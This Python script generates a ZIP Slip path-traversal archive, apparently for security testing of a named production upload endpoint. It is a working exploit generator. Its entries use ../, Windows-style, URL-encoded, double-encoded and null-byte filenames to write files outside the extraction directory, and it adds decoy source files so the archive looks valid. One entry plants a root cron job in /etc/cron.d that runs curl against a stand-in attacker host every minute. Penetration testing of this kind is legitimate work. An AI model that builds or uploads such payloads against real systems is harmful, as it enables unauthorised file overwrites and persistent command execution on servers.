#!/usr/bin/env python3
"""
generate_zipslip.py
Category : ZIP Slip / Path Traversal
Target   : /scan/folder  (GenAI Security Agent — ZIP upload endpoint)

Generates a crafted ZIP archive whose entries use path traversal sequences
in their filenames. A vulnerable ZIP extractor will write files outside the
intended extraction directory.

Usage:
    python3 generate_zipslip.py
    # Produces: zipslip_payload.zip  (upload to /scan/folder)

Safe behaviour  : Server rejects or sanitises traversal paths.
Vuln indicators :
  - HTTP 500 with path-related error message
  - Response time spike (file written to unexpected location)
  - Subsequent requests reveal written file content
"""

import zipfile
import io
import os

OUTPUT_FILE = "zipslip_payload.zip"

# Each entry: (zip_entry_name, file_content)
TRAVERSAL_ENTRIES = [
    # Classic Unix traversal — write to /tmp
    ("../../../tmp/zipslip_test.txt",
     b"ZipSlip test file written by security test\n"),

    # Attempt to overwrite cron job
    ("../../../../etc/cron.d/zipslip_backdoor",
     b"* * * * * root curl http://canary.attacker.invalid/zipslip\n"),

    # Attempt to write to app working directory parent
    ("../../zipslip_canary.txt",
     b"ZipSlip canary - check if this file exists outside extraction dir\n"),

    # Windows-style traversal (for cross-platform extractors)
    ("..\\..\\..\\Windows\\Temp\\zipslip_test.txt",
     b"ZipSlip Windows path test\n"),

    # URL-encoded traversal (some extractors decode before writing)
    ("%2e%2e%2f%2e%2e%2ftmp%2fzipslip_encoded.txt",
     b"URL-encoded ZipSlip test\n"),

    # Double-encoded
    ("%252e%252e%252f%252e%252e%252ftmp%252fzipslip_double_encoded.txt",
     b"Double URL-encoded ZipSlip test\n"),

    # Null byte injection in path (bypasses some extension checks)
    ("safe_looking_file\x00.py",
     b"Null byte in filename test\n"),

    # Legitimate-looking entry to make the ZIP appear valid
    ("src/main.py",
     b"# Legitimate source file\nprint('hello world')\n"),

    ("src/utils.py",
     b"# Utility functions\ndef add(a, b):\n    return a + b\n"),

    ("README.md",
     b"# Test Project\nThis is a security test project.\n"),
]

def create_zipslip_archive(output_path: str) -> None:
    buf = io.BytesIO()

    with zipfile.ZipFile(buf, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
        for entry_name, content in TRAVERSAL_ENTRIES:
            # ZipInfo lets us set the filename directly without sanitisation
            info = zipfile.ZipInfo(filename=entry_name)
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, content)

    with open(output_path, "wb") as f:
        f.write(buf.getvalue())

    size_kb = os.path.getsize(output_path) / 1024
    print(f"[+] Created: {output_path} ({size_kb:.1f} KB)")
    print(f"[+] Entries: {len(TRAVERSAL_ENTRIES)}")
    print()
    print("Traversal paths embedded:")
    for name, _ in TRAVERSAL_ENTRIES:
        print(f"  {repr(name)}")

    print()
    print("Upload to: POST https://dev-guardian-production.up.railway.app/scan/folder")
    print("Field    : ZIP file (multipart/form-data)")
    print()
    print("Indicators of vulnerability:")
    print("  - HTTP 500 with path error")
    print("  - Check if /tmp/zipslip_test.txt exists on server")
    print("  - Check canary: http://canary.attacker.invalid/zipslip (use Burp Collaborator)")


if __name__ == "__main__":
    create_zipslip_archive(OUTPUT_FILE)
